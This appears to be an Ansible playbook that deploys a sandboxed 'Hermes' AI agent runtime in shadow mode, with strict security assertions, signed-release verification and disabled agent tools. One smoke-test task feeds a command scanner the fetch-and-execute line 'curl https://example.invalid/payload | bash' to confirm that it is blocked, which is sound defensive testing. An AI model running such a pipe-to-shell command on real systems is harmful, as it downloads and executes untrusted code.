---
# Purpose: Stage the isolated Hermes replacement without production delivery.
# Hosts: hermes_hosts.
# Key vars: hermes_shadow_*.
# Templates: templates/hermes.
# Scripts: scripts/agents/hermes-shadow-target-audit.py.
# Validation: ansible-playbook playbooks/agents/hermes-shadow.yml
#             --syntax-check.

- name: Configure isolated Hermes shadow runtime
  hosts: hermes_hosts
  become: true
  gather_facts: false

  vars:
    hermes_shadow_contract_path: >-
      {{ playbook_dir }}/../../{{ hermes_shadow_contract_source }}
    hermes_shadow_contract: >-
      {{ lookup(
           'ansible.builtin.file',
           hermes_shadow_contract_path
         ) | from_json }}

  tasks:
    - name: Validate Hermes shadow mode
      ansible.builtin.assert:
        that:
          - hermes_shadow_mode in ['disabled', 'bootstrap', 'shadow']
        fail_msg: >-
          hermes_shadow_mode must be disabled, bootstrap, or shadow. This
          playbook does not implement production delivery or cutover.

    - name: Inspect Hermes shadow units
      ansible.builtin.stat:
        path: "/etc/systemd/system/hermes-gateway-{{ item.name }}.service"
      loop: "{{ hermes_shadow_profiles }}"
      loop_control:
        label: "{{ item.name }}"
      register: hermes_shadow_units
      check_mode: false

    - name: Stop Hermes shadow units when disabled
      ansible.builtin.systemd_service:
        name: "hermes-gateway-{{ item.item.name }}.service"
        enabled: false
        state: stopped
      loop: "{{ hermes_shadow_units.results }}"
      loop_control:
        label: "{{ item.item.name }}"
      when:
        - hermes_shadow_mode == 'disabled'
        - item.stat.exists

    - name: Skip hosts without Hermes shadow approval
      ansible.builtin.meta: end_host
      when: hermes_shadow_mode == 'disabled'

    - name: Require explicit Hermes shadow approval
      ansible.builtin.assert:
        that:
          - hermes_shadow_change_approved | bool
          - inventory_hostname == hermes_shadow_contract.deployment.targetHost
          - hermes_shadow_contract.deployment.mode == 'shadow'
          - hermes_shadow_contract.deployment.sameHostReplacement | bool
          - not hermes_shadow_contract.deployment.sourceRuntimeConcurrentEnabled
          - hermes_shadow_contract.deployment.sourceFilesRetained | bool
          - >-
            not hermes_shadow_contract.deployment
            .sourceFilesDirectlyReadableByHermes
          - not hermes_shadow_contract.deployment.productionDeliveryEnabled
          - not hermes_shadow_contract.deployment.productionSchedulerEnabled
          - not hermes_shadow_contract.deployment.productionRouteEnabled
          - not hermes_shadow_contract.deployment.sourceCleanupEnabled
          - not hermes_shadow_contract.deployment.sourceArchiveEnabled
          - hermes_shadow_contract.runtime.rootManagedCommandScanner | bool
          - not hermes_shadow_contract.runtime.runtimeLazyInstallsEnabled
          - not hermes_shadow_contract.runtime.scannerRuntimeNetworkEnabled
          - not hermes_shadow_contract.commonPolicy.privateUrlAccess
          - not hermes_shadow_contract.commonPolicy.tirithFailOpen
          - hermes_shadow_contract.sandbox.binary == '/usr/bin/podman'
          - hermes_shadow_contract.sandbox.rootless | bool
          - not hermes_shadow_contract.sandbox.dockerGroup
          - not hermes_shadow_contract.sandbox.dockerSocket
          - not hermes_shadow_contract.sandbox.localTerminalFallback
          - not hermes_shadow_contract.sandbox.networkEnabled
          - hermes_shadow_contract.sandbox.hostVolumes | length == 0
          - hermes_shadow_contract.sandbox.forwardEnvironment | length == 0
          - hermes_shadow_contract.sandbox.forwardCredentialFiles | length == 0
          - hermes_shadow_config_version | int > 0
          - >-
            hermes_shadow_profiles | map(attribute='name') | list
            == ['astra', 'dubble', 'rigel']
        fail_msg: >-
          The requested host, mode, profiles, or security boundary differs from
          the reviewed Hermes shadow contract.

    - name: Validate Hermes profile identity declarations
      ansible.builtin.assert:
        that:
          - item.user == 'hermes-' + item.name
          - item.group == item.user
          - item.home == '/var/lib/hermes/' + item.name
          - item.uid | int >= 62010
          - item.uid | int <= 62012
          - item.subid_start | int >= 200000
          - item.discord_allowed_users | length == 0
          - item.discord_allowed_channels | length == 0
          - item.discord_free_response_channels | length == 0
          - item.discord_admin_users | length == 0
          - not item.discord_slash_commands | bool
          - >-
            item.plugins_enabled
            == (['star-dispatch-privacy'] if item.name == 'astra' else [])
          - item.toolsets | length > 0
          - "'terminal' in item.disabled_toolsets"
          - "'file' in item.disabled_toolsets"
          - "'code_execution' in item.disabled_toolsets"
          - "'discord_admin' in item.disabled_toolsets"
        fail_msg: >-
          Hermes profile {{ item.name }} exceeds its reviewed authority.
      loop: "{{ hermes_shadow_profiles }}"
      loop_control:
        label: "{{ item.name }}"

    - name: Read Hermes target logical CPU capacity
      ansible.builtin.command:
        argv:
          - getconf
          - _NPROCESSORS_ONLN
      register: hermes_shadow_host_cpus
      check_mode: false
      changed_when: false

    - name: Read Hermes target available memory
      ansible.builtin.command:
        argv:
          - awk
          - /MemAvailable/ {print int($2 / 1024)}
          - /proc/meminfo
      register: hermes_shadow_host_available_memory
      check_mode: false
      changed_when: false

    - name: Read Hermes target free root filesystem space
      ansible.builtin.command:
        argv:
          - df
          - --output=avail
          - -BG
          - /
      register: hermes_shadow_host_free_disk
      check_mode: false
      changed_when: false

    - name: Require reviewed same-host Hermes capacity
      ansible.builtin.assert:
        that:
          - >-
            hermes_shadow_host_cpus.stdout | int
            >= hermes_shadow_contract.host.minimumLogicalCpus | int
          - >-
            hermes_shadow_host_available_memory.stdout | int
            >= hermes_shadow_contract.host.minimumAvailableMemoryMiB | int
          - >-
            hermes_shadow_host_free_disk.stdout_lines[-1]
            | regex_replace('[^0-9]', '') | int
            >= hermes_shadow_contract.host.minimumFreeDiskGiB | int
        fail_msg: >-
          The same-host Hermes CPU, available-memory, or free-disk preflight no
          longer meets the reviewed contract. Do not install or start Hermes.

    - name: Inspect Hermes runtime
      ansible.builtin.stat:
        path: "{{ hermes_shadow_runtime_binary }}"
      register: hermes_shadow_runtime
      check_mode: false

    - name: Require reviewed Hermes release provenance
      ansible.builtin.assert:
        that:
          - >-
            hermes_shadow_install_ref
            is match('^v[0-9]{4}(\.[0-9]+){2,3}$')
          - >-
            hermes_shadow_expected_commit
            is match('^[0-9a-f]{40}$')
          - >-
            hermes_shadow_expected_tag_object
            is match('^[0-9a-f]{40}$')
        fail_msg: >-
          Every active Hermes run requires a reviewed release tag object and
          that tag's exact expected commit.

    - name: Require reviewed root-managed Tirith provenance
      ansible.builtin.assert:
        that:
          - hermes_tirith_release_track == 'official-latest'
          - hermes_tirith_version is match('^[0-9]+(\.[0-9]+){2}$')
          - >-
            hermes_tirith_release_base_url
            == 'https://github.com/sheeki03/tirith/releases/download/v'
               ~ hermes_tirith_version
          - >-
            hermes_tirith_archive_name
            == 'tirith-x86_64-unknown-linux-gnu.tar.gz'
          - hermes_tirith_archive_sha256 is match('^[0-9a-f]{64}$')
          - hermes_tirith_checksums_sha256 is match('^[0-9a-f]{64}$')
          - hermes_tirith_signature_sha256 is match('^[0-9a-f]{64}$')
          - >-
            hermes_tirith_certificate_encoded_sha256
            is match('^[0-9a-f]{64}$')
          - hermes_tirith_certificate_sha256 is match('^[0-9a-f]{64}$')
          - hermes_tirith_binary == '/usr/local/libexec/hermes-tirith'
        fail_msg: >-
          Tirith must use the reviewed official release transaction and an
          absolute root-managed runtime path.

    - name: Require reviewed locked artifacts for a new runtime
      ansible.builtin.assert:
        that:
          - hermes_shadow_install_approved | bool
          - >-
            hermes_shadow_uv_archive_sha256
            is match('^[0-9a-f]{64}$')
          - hermes_shadow_uv_version is match('^[0-9]+(\.[0-9]+){2}$')
        fail_msg: >-
          A fresh Hermes install requires explicit approval and the reviewed
          uv release checksum used by the locked dependency transaction.
      when: not hermes_shadow_runtime.stat.exists

    - name: Install Hermes shadow host prerequisites
      ansible.builtin.apt:
        name:
          - ca-certificates
          - cosign
          - curl
          - fuse-overlayfs
          - git
          - podman
          - slirp4netns
          - uidmap
          - xz-utils
        state: present
        update_cache: true

    - name: Create Hermes service groups
      ansible.builtin.group:
        name: "{{ item.group }}"
        gid: "{{ item.uid }}"
        system: true
        state: present
      loop: "{{ hermes_shadow_profiles }}"
      loop_control:
        label: "{{ item.name }}"

    - name: Create Hermes no-login service accounts
      ansible.builtin.user:
        name: "{{ item.user }}"
        uid: "{{ item.uid }}"
        group: "{{ item.group }}"
        home: "{{ item.home }}"
        shell: /usr/sbin/nologin
        create_home: true
        system: true
        password_lock: true
        state: present
      loop: "{{ hermes_shadow_profiles }}"
      loop_control:
        label: "{{ item.name }}"

    - name: Allocate rootless Podman subordinate UIDs
      ansible.builtin.lineinfile:
        path: /etc/subuid
        regexp: "^{{ item.user | regex_escape }}:"
        line: "{{ item.user }}:{{ item.subid_start }}:65536"
        create: true
        owner: root
        group: root
        mode: "0644"
        backup: true
      loop: "{{ hermes_shadow_profiles }}"
      loop_control:
        label: "{{ item.name }}"

    - name: Allocate rootless Podman subordinate GIDs
      ansible.builtin.lineinfile:
        path: /etc/subgid
        regexp: "^{{ item.user | regex_escape }}:"
        line: "{{ item.user }}:{{ item.subid_start }}:65536"
        create: true
        owner: root
        group: root
        mode: "0644"
        backup: true
      loop: "{{ hermes_shadow_profiles }}"
      loop_control:
        label: "{{ item.name }}"

    - name: Create Hermes root-owned deployment directories
      ansible.builtin.file:
        path: "{{ item }}"
        state: directory
        owner: root
        group: root
        mode: "0755"
      loop:
        - /etc/hermes
        - /usr/local/share/hermes-shadow
        - /usr/local/share/hermes-shadow/repository
        - /usr/local/share/hermes-shadow/repository/files
        - /usr/local/share/hermes-shadow/repository/files/hermes
        - /usr/local/share/hermes-shadow/repository/files/hermes/jobs
        - /usr/local/share/hermes-shadow/repository/files/openclaw
        - /usr/local/share/hermes-shadow/repository/playbooks
        - /usr/local/share/hermes-shadow/repository/playbooks/agents
        - /usr/local/share/hermes-shadow/repository/scripts
        - /usr/local/share/hermes-shadow/repository/scripts/agents
        - /usr/local/libexec
        - /var/cache/hermes
        - "{{ hermes_tirith_cache_root }}"
        - "{{ hermes_tirith_extract_root }}"
        - "{{ hermes_tirith_cache_root }}/smoke-home"
        - "{{ hermes_shadow_uv_extract_dir }}"
        - "{{ hermes_shadow_uv_cache_dir }}"
        - /var/lib/hermes/bootstrap
        - /var/lib/hermes/bootstrap/bin
        - "{{ hermes_shadow_uv_config_home }}"
        - "{{ hermes_shadow_uv_config_dirs }}"
        - /usr/local/share/uv

    - name: Create per-profile Hermes managed scopes
      ansible.builtin.file:
        path: "/etc/hermes/{{ item.name }}"
        state: directory
        owner: root
        group: "{{ item.group }}"
        mode: "0750"
      loop: "{{ hermes_shadow_profiles }}"
      loop_control:
        label: "{{ item.name }}"

    - name: Download reviewed Tirith release assets
      ansible.builtin.get_url:
        url: "{{ item.url }}"
        dest: "{{ item.dest }}"
        checksum: "sha256:{{ item.sha256 }}"
        owner: root
        group: root
        mode: "0644"
      loop:
        - url: >-
            {{ hermes_tirith_release_base_url
               ~ '/' ~ hermes_tirith_archive_name }}
          dest: "{{ hermes_tirith_archive_cache }}"
          sha256: "{{ hermes_tirith_archive_sha256 }}"
        - url: "{{ hermes_tirith_release_base_url }}/checksums.txt"
          dest: "{{ hermes_tirith_checksums_cache }}"
          sha256: "{{ hermes_tirith_checksums_sha256 }}"
        - url: "{{ hermes_tirith_release_base_url }}/checksums.txt.sig"
          dest: "{{ hermes_tirith_signature_cache }}"
          sha256: "{{ hermes_tirith_signature_sha256 }}"
        - url: "{{ hermes_tirith_release_base_url }}/checksums.txt.pem"
          dest: "{{ hermes_tirith_certificate_encoded_cache }}"
          sha256: "{{ hermes_tirith_certificate_encoded_sha256 }}"
      loop_control:
        label: "{{ item.dest }}"

    - name: Decode reviewed Tirith signing certificate
      ansible.builtin.command:
        argv:
          - /usr/bin/base64
          - --decode
          - "{{ hermes_tirith_certificate_encoded_cache }}"
      register: hermes_tirith_decoded_certificate
      changed_when: false
      when: not ansible_check_mode

    - name: Stage decoded Tirith signing certificate
      ansible.builtin.copy:
        content: "{{ hermes_tirith_decoded_certificate.stdout }}\n"
        dest: "{{ hermes_tirith_certificate_cache }}"
        owner: root
        group: root
        mode: "0644"
      when: not ansible_check_mode

    - name: Inspect decoded Tirith certificate checksum
      ansible.builtin.stat:
        path: "{{ hermes_tirith_certificate_cache }}"
        checksum_algorithm: sha256
      register: hermes_tirith_decoded_certificate_stat
      when: not ansible_check_mode

    - name: Require exact decoded Tirith signing certificate
      ansible.builtin.assert:
        that:
          - >-
            hermes_tirith_decoded_certificate_stat.stat.checksum
            == hermes_tirith_certificate_sha256
        fail_msg: The decoded Tirith signing certificate hash changed.
      when: not ansible_check_mode

    - name: Verify Tirith signed checksum provenance
      ansible.builtin.command:
        argv:
          - /usr/bin/cosign
          - verify-blob
          - --certificate
          - "{{ hermes_tirith_certificate_cache }}"
          - --signature
          - "{{ hermes_tirith_signature_cache }}"
          - --certificate-identity-regexp
          - "{{ hermes_tirith_cosign_identity_regexp }}"
          - --certificate-oidc-issuer
          - "{{ hermes_tirith_cosign_issuer }}"
          - "{{ hermes_tirith_checksums_cache }}"
      changed_when: false
      when: not ansible_check_mode

    - name: Require Tirith archive in signed checksum manifest
      ansible.builtin.command:
        argv:
          - /usr/bin/grep
          - --fixed-strings
          - --line-regexp
          - >-
            {{ hermes_tirith_archive_sha256
               ~ '  ' ~ hermes_tirith_archive_name }}
          - "{{ hermes_tirith_checksums_cache }}"
      changed_when: false
      when: not ansible_check_mode

    - name: Extract reviewed Tirith release archive
      ansible.builtin.unarchive:
        src: "{{ hermes_tirith_archive_cache }}"
        dest: "{{ hermes_tirith_extract_root }}"
        remote_src: true
        creates: "{{ hermes_tirith_extract_root }}/tirith"
      when: not ansible_check_mode

    - name: Install root-managed Tirith binary
      ansible.builtin.copy:
        src: "{{ hermes_tirith_extract_root }}/tirith"
        dest: "{{ hermes_tirith_binary }}"
        remote_src: true
        owner: root
        group: root
        mode: "0555"
      when: not ansible_check_mode

    - name: Read root-managed Tirith version
      ansible.builtin.command:
        argv:
          - "{{ hermes_tirith_binary }}"
          - --version
      register: hermes_tirith_installed_version
      changed_when: false
      when: not ansible_check_mode

    - name: Require reviewed Tirith version
      ansible.builtin.assert:
        that:
          - >-
            hermes_tirith_installed_version.stdout
            == 'tirith ' ~ hermes_tirith_version
        fail_msg: >-
          The root-managed Tirith binary does not match the reviewed version.
      when: not ansible_check_mode

    - name: Prove Tirith allows a benign command offline
      ansible.builtin.command:
        argv:
          - "{{ hermes_tirith_binary }}"
          - check
          - --json
          - --non-interactive
          - --no-daemon
          - --shell
          - posix
          - --
          - printf hermes-tokenless-smoke
      environment:
        HOME: "{{ hermes_tirith_cache_root }}/smoke-home"
        TIRITH_OFFLINE: "1"
      register: hermes_tirith_allow_probe
      changed_when: false
      when: not ansible_check_mode

    - name: Prove Tirith blocks pipe-to-interpreter offline
      ansible.builtin.command:
        argv:
          - "{{ hermes_tirith_binary }}"
          - check
          - --json
          - --non-interactive
          - --no-daemon
          - --shell
          - posix
          - --
          - curl https://example.invalid/payload | bash
      environment:
        HOME: "{{ hermes_tirith_cache_root }}/smoke-home"
        TIRITH_OFFLINE: "1"
      register: hermes_tirith_block_probe
      changed_when: false
      failed_when: hermes_tirith_block_probe.rc != 1
      when: not ansible_check_mode

    - name: Require expected Tirith offline smoke verdicts
      ansible.builtin.assert:
        that:
          - hermes_tirith_allow_probe.rc == 0
          - hermes_tirith_allow_probe.stdout is search('"action":"allow"')
          - hermes_tirith_block_probe.stdout is search('"action":"block"')
        fail_msg: Tirith did not produce the expected allow and block verdicts.
      when: not ansible_check_mode

    - name: Inspect Astra Star plugin directories
      ansible.builtin.stat:
        path: "{{ item }}"
        follow: false
      loop:
        - /etc/hermes/astra/plugins
        - "{{ hermes_star_privacy_plugin_managed_root }}"
        - /var/lib/hermes/astra/plugins
        - "{{ hermes_star_privacy_plugin_runtime_root }}"
      register: hermes_star_privacy_plugin_directories

    - name: Reject unsafe Astra Star plugin directories
      ansible.builtin.assert:
        that:
          - not item.stat.exists or (item.stat.isdir and not item.stat.islnk)
        fail_msg: >-
          An Astra Star plugin path is not absent or a regular, non-symlink
          directory.
      loop: "{{ hermes_star_privacy_plugin_directories.results }}"
      loop_control:
        label: "{{ item.item }}"

    - name: Create root-owned Astra Star plugin directories
      ansible.builtin.file:
        path: "{{ item }}"
        state: directory
        owner: root
        group: hermes-astra
        mode: "0750"
      loop:
        - /etc/hermes/astra/plugins
        - "{{ hermes_star_privacy_plugin_managed_root }}"
        - /var/lib/hermes/astra/plugins
        - "{{ hermes_star_privacy_plugin_runtime_root }}"

    - name: Create per-profile Hermes mutable directories
      ansible.builtin.file:
        path: "{{ item.0.home }}/{{ item.1 }}"
        state: directory
        owner: "{{ item.0.user }}"
        group: "{{ item.0.group }}"
        mode: "0700"
      loop: >-
        {{ hermes_shadow_profiles
           | product([
               'memories', 'skills', 'cron', 'sessions', 'logs', 'pending',
               'data', 'state'
             ])
           | list }}
      loop_control:
        label: "{{ item.0.name }}/{{ item.1 }}"

    - name: Create root-owned Hermes script directories
      ansible.builtin.file:
        path: "{{ item.home }}/scripts"
        state: directory
        owner: root
        group: "{{ item.group }}"
        mode: "0750"
      loop: "{{ hermes_shadow_profiles }}"
      loop_control:
        label: "{{ item.name }}"

    - name: Inspect native Hermes managed-skill mountpoints
      ansible.builtin.stat:
        path: "{{ item.home }}/skills/managed"
        follow: false
      loop: "{{ hermes_shadow_profiles }}"
      loop_control:
        label: "{{ item.name }}"
      register: hermes_shadow_managed_skill_mountpoints

    - name: Reject unsafe native Hermes managed-skill mountpoints
      ansible.builtin.assert:
        that:
          - not item.stat.exists or (item.stat.isdir and not item.stat.islnk)
        fail_msg: >-
          A native Hermes managed-skill mountpoint is not absent or a regular,
          non-symlink directory.
      loop: "{{ hermes_shadow_managed_skill_mountpoints.results }}"
      loop_control:
        label: "{{ item.item.name }}"

    - name: Create root-owned native Hermes managed-skill mountpoints
      ansible.builtin.file:
        path: "{{ item.home }}/skills/managed"
        state: directory
        owner: root
        group: "{{ item.group }}"
        mode: "0750"
      loop: "{{ hermes_shadow_profiles }}"
      loop_control:
        label: "{{ item.name }}"

    - name: Inspect Hermes profile-data runtime mountpoints
      ansible.builtin.stat:
        path: "{{ item.0.home }}/{{ item.1 }}"
        follow: false
      loop: >-
        {{ hermes_shadow_profiles
           | product(['imported-data', 'managed-data'])
           | list }}
      register: hermes_shadow_profile_data_mountpoints

    - name: Reject unsafe Hermes profile-data runtime mountpoints
      ansible.builtin.assert:
        that:
          - not item.stat.exists or (item.stat.isdir and not item.stat.islnk)
        fail_msg: >-
          A Hermes profile-data runtime mountpoint is not absent or a regular,
          non-symlink directory.
      loop: "{{ hermes_shadow_profile_data_mountpoints.results }}"
      loop_control:
        label: "{{ item.item.0.name }}/{{ item.item.1 }}"

    - name: Create root-owned Hermes profile-data runtime mountpoints
      ansible.builtin.file:
        path: "{{ item.0.home }}/{{ item.1 }}"
        state: directory
        owner: root
        group: "{{ item.0.group }}"
        mode: "0750"
      loop: >-
        {{ hermes_shadow_profiles
           | product(['imported-data', 'managed-data'])
           | list }}
      loop_control:
        label: "{{ item.0.name }}/{{ item.1 }}"

    - name: Inspect Hermes profile-transform runtime mountpoints
      ansible.builtin.stat:
        path: "{{ item.0.home }}/{{ item.1 }}"
        follow: false
      loop: >-
        {{ hermes_shadow_profiles
           | product(['transformed-data', 'transformed-managed'])
           | list }}
      register: hermes_shadow_profile_transform_mountpoints

    - name: Reject unsafe Hermes profile-transform runtime mountpoints
      ansible.builtin.assert:
        that:
          - not item.stat.exists or (item.stat.isdir and not item.stat.islnk)
        fail_msg: >-
          A Hermes profile-transform runtime mountpoint is not absent or a
          regular, non-symlink directory.
      loop: "{{ hermes_shadow_profile_transform_mountpoints.results }}"
      loop_control:
        label: "{{ item.item.0.name }}/{{ item.item.1 }}"

    - name: Create root-owned Hermes profile-transform runtime mountpoints
      ansible.builtin.file:
        path: "{{ item.0.home }}/{{ item.1 }}"
        state: directory
        owner: root
        group: "{{ item.0.group }}"
        mode: "0750"
      loop: >-
        {{ hermes_shadow_profiles
           | product(['transformed-data', 'transformed-managed'])
           | list }}
      loop_control:
        label: "{{ item.0.name }}/{{ item.1 }}"

    - name: Download reviewed uv release archive
      ansible.builtin.get_url:
        url: "{{ hermes_shadow_uv_archive_url }}"
        dest: "{{ hermes_shadow_uv_archive_cache }}"
        checksum: "sha256:{{ hermes_shadow_uv_archive_sha256 }}"
        owner: root
        group: root
        mode: "0644"
      when: not hermes_shadow_runtime.stat.exists

    - name: Extract reviewed uv release archive
      ansible.builtin.unarchive:
        src: "{{ hermes_shadow_uv_archive_cache }}"
        dest: "{{ hermes_shadow_uv_extract_dir }}"
        remote_src: true
        creates: >-
          {{ hermes_shadow_uv_extract_dir
             }}/uv-x86_64-unknown-linux-gnu/uv
      when: not hermes_shadow_runtime.stat.exists

    - name: Install reviewed Hermes-managed uv binary
      ansible.builtin.copy:
        src: >-
          {{ hermes_shadow_uv_extract_dir
             }}/uv-x86_64-unknown-linux-gnu/uv
        dest: "{{ hermes_shadow_uv_binary }}"
        remote_src: true
        owner: root
        group: root
        mode: "0755"
      when: not hermes_shadow_runtime.stat.exists

    - name: Verify reviewed Hermes-managed uv version
      ansible.builtin.command:
        argv:
          - "{{ hermes_shadow_uv_binary }}"
          - --version
      register: hermes_shadow_uv_installed_version
      changed_when: false
      when: not hermes_shadow_runtime.stat.exists

    - name: Require exact Hermes-managed uv version
      ansible.builtin.assert:
        that:
          - >-
            hermes_shadow_uv_installed_version.stdout
            is match(
              '^uv '
              ~ (hermes_shadow_uv_version | regex_escape)
              ~ '(?:\\s|$)'
            )
        fail_msg: >-
          Expected reviewed uv {{ hermes_shadow_uv_version }}; got
          {{ hermes_shadow_uv_installed_version.stdout | default('missing') }}.
      when: not hermes_shadow_runtime.stat.exists

    - name: Check out exact official Hermes source
      ansible.builtin.git:
        repo: "{{ hermes_shadow_source_repo }}"
        dest: "{{ hermes_shadow_runtime_root }}"
        version: "{{ hermes_shadow_expected_commit }}"
        force: false
        update: true
      when: not hermes_shadow_runtime.stat.exists

    - name: Synchronize only locked Hermes dependencies
      ansible.builtin.command:
        argv:
          - "{{ hermes_shadow_uv_binary }}"
          - sync
          - --extra
          - all
          - --locked
        chdir: "{{ hermes_shadow_runtime_root }}"
        creates: "{{ hermes_shadow_runtime_venv }}/bin/hermes"
      environment:
        HOME: /var/lib/hermes/bootstrap
        HERMES_HOME: /var/lib/hermes/bootstrap
        XDG_CONFIG_HOME: "{{ hermes_shadow_uv_config_home }}"
        XDG_CONFIG_DIRS: "{{ hermes_shadow_uv_config_dirs }}"
        UV_CACHE_DIR: "{{ hermes_shadow_uv_cache_dir }}"
        UV_NO_ENV_FILE: "1"
        UV_PROJECT_ENVIRONMENT: "{{ hermes_shadow_runtime_venv }}"
        UV_PYTHON_INSTALL_DIR: /usr/local/share/uv/python
        UV_PYTHON_BIN_DIR: /usr/local/share/uv/bin
      when: not hermes_shadow_runtime.stat.exists

    - name: Install Hermes launcher
      ansible.builtin.copy:
        content: |
          #!/usr/bin/env bash
          unset PYTHONPATH
          unset PYTHONHOME
          exec "{{ hermes_shadow_runtime_venv }}/bin/python" \
            "{{ hermes_shadow_runtime_root }}/hermes" "$@"
        dest: "{{ hermes_shadow_runtime_binary }}"
        owner: root
        group: root
        mode: "0755"
      when: not hermes_shadow_runtime.stat.exists

    - name: Record native Hermes Git install method
      ansible.builtin.copy:
        content: "git\n"
        dest: "{{ hermes_shadow_runtime_root }}/.install_method"
        owner: root
        group: root
        mode: "0644"

    - name: Disable bundled skill seeding for Hermes profiles
      ansible.builtin.copy:
        content: "managed\n"
        dest: "{{ item.home }}/.no-bundled-skills"
        owner: root
        group: "{{ item.group }}"
        mode: "0440"
      loop: "{{ hermes_shadow_profiles }}"
      loop_control:
        label: "{{ item.name }}"

    - name: Inspect Hermes source origin
      ansible.builtin.command:
        argv:
          - /usr/bin/git
          - -C
          - "{{ hermes_shadow_runtime_root }}"
          - remote
          - get-url
          - origin
      register: hermes_shadow_installed_origin
      check_mode: false
      changed_when: false

    - name: Inspect Hermes source commit
      ansible.builtin.command:
        argv:
          - /usr/bin/git
          - -C
          - "{{ hermes_shadow_runtime_root }}"
          - rev-parse
          - HEAD
      register: hermes_shadow_installed_commit
      check_mode: false
      changed_when: false

    - name: Inspect reviewed Hermes release tag object
      ansible.builtin.command:
        argv:
          - /usr/bin/git
          - -C
          - "{{ hermes_shadow_runtime_root }}"
          - rev-parse
          - "refs/tags/{{ hermes_shadow_install_ref }}"
      register: hermes_shadow_installed_tag_object
      check_mode: false
      changed_when: false

    - name: Resolve reviewed Hermes release tag
      ansible.builtin.command:
        argv:
          - /usr/bin/git
          - -C
          - "{{ hermes_shadow_runtime_root }}"
          - rev-list
          - -n
          - "1"
          - "{{ hermes_shadow_install_ref }}"
      register: hermes_shadow_installed_tag_commit
      check_mode: false
      changed_when: false

    - name: Inspect Hermes source modifications
      ansible.builtin.command:
        argv:
          - /usr/bin/git
          - -C
          - "{{ hermes_shadow_runtime_root }}"
          - status
          - --porcelain
          - --untracked-files=all
      register: hermes_shadow_installed_status
      check_mode: false
      changed_when: false

    - name: Require exact Hermes source
      ansible.builtin.assert:
        that:
          - >-
            hermes_shadow_installed_origin.stdout
            == 'https://github.com/NousResearch/hermes-agent.git'
          - >-
            hermes_shadow_installed_commit.stdout
            == hermes_shadow_expected_commit
          - >-
            hermes_shadow_installed_tag_object.stdout
            == hermes_shadow_expected_tag_object
          - >-
            hermes_shadow_installed_tag_commit.stdout
            == hermes_shadow_expected_commit
          - hermes_shadow_installed_status.stdout | length == 0
        fail_msg: >-
          The installed Hermes source origin, tag, commit, or clean-tree state
          differs from the attended release transaction.

    - name: Verify Hermes runtime layout
      ansible.builtin.stat:
        path: "{{ item }}"
      loop:
        - "{{ hermes_shadow_runtime_binary }}"
        - "{{ hermes_shadow_runtime_root }}"
